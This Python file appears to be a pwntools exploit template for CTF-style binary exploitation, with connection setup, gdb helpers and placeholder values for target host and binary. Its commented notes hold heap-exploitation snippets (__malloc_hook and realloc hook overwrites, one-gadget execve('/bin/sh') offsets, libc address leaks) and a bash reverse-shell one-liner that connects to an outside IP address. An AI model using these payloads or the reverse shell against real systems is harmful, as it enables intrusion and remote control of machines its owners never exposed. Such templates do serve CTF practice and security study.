#coding:utf-8
from pwn import *
import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

# amd64 or x86
context(arch = 'ARCH', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./FILENAME"
ip = "HOST"
port = PORT

LOCAL = len(sys.argv)==1

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./remote_libc"
if LOCAL:
    io = process(filename, aslr=False)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}, aslr=False) 
    # libc = ELF(remote_libc)
else:
    if len(sys.argv) == 3:
        io = remote(sys.argv[1], int(sys.argv[2], 10))
    else:
        io = remote(ip, port)
    # libc = elf.libc
    libc = ELF(remote_libc)

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, XXX, str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))


pause(io)

io.interactive()

# std_in_off = libc.symbols['_IO_2_1_stdin_']

# t = '''bash -c 'bash -i >& /dev/tcp/47.94.239.235/9981 0>&1'''

# '''0x3057 ^ 0x4f65 ^ 0xffff == 0x80cd'''
# _= libc.symbols['realloc']
# _= libc.symbols['__free_hook']


# use malloc to one gadget
# fake2 = libc.symbols['__malloc_hook'] - 0x23 # malloc hook 
# payload = "a"*19 + p64(one) 

# use reallochook
# payload = "a"*(19-8) + p64(one) + p64(libc.symbols['realloc'] + offset)

"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

# libc_addr       = u64(rv(io, 6) + b'\0\0')
# lg("libc_addr", libc_addr)
# libc.address    = libc_addr - 0x3c4b78  # unsorted bin offset 
# libc.address    = u64(rv(io, 6) + b'\0\0') - libc.symbols['puts']
# lg("libc.address", libc.address)
# binsh_addr      = next(libc.search("/bin/sh\0"))
# system_addr     = libc.symbols['system']
# sc_53           = libc.symbols['setcontext'] + 53


# <realloc>       push   r15
# <realloc+2>     push   r14
# <realloc+4>     push   r13
# <realloc+6>     push   r12
# <realloc+8>     mov    r13, rsi
# <realloc+11>    push   rbp
# <realloc+12>    push   rbx
# <realloc+13>    mov    rbx, rdi
# <realloc+16>    sub    rsp, 0x38
